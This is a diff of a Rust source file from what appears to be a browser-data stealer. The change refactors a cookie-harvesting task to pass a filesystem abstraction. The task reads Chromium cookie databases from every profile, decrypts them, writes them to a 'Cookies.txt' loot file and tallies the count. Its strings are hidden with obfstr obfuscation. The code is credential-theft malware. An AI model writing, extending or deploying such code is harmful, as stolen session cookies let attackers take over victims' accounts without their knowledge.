@@ -1,12 +1,14 @@
 use crate::alloc::borrow::ToOwned;
-use crate::chromium::{BrowserData, decrypt_data};
-use crate::{Cookie, collect_and_read_sqlite_from_all_profiles, to_string_and_write_all};
+use crate::chromium::{decrypt_data, BrowserData};
+use crate::{collect_and_read_sqlite_from_all_profiles, to_string_and_write_all, Cookie};
 use alloc::sync::Arc;
 use collector::{Browser, Collector};
 use database::TableRecord;
+use filesystem::path::Path;
+use filesystem::storage::StorageFileSystem;
+use filesystem::FileSystem;
 use obfstr::obfstr as s;
-use tasks::{Task, parent_name};
-use utils::path::Path;
+use tasks::{parent_name, Task};
 
 const COOKIES_HOST_KEY: usize = 1;
 const COOKIES_NAME: usize = 3;
@@ -24,12 +26,13 @@ impl CookiesTask {
     }
 }
 
-impl<C: Collector> Task<C> for CookiesTask {
+impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask {
     parent_name!("Cookies.txt");
 
-    fn run(&self, parent: &Path, collector: &C) {
+    fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         let Some(cookies) = collect_and_read_sqlite_from_all_profiles(
             &self.browser.profiles,
+            &StorageFileSystem,
             |profile| profile / s!("Network") / s!("Cookies"),
             s!("Cookies"),
             |record| extract_cookie_from_record(record, &self.browser),
@@ -38,7 +41,7 @@ impl<C: Collector> Task<C> for CookiesTask {
         };
 
         collector.get_browser().increase_cookies_by(cookies.len());
-        let _ = to_string_and_write_all(&cookies, "\n", parent);
+        let _ = to_string_and_write_all(&cookies, "\n", filesystem, parent);
     }
 }
 
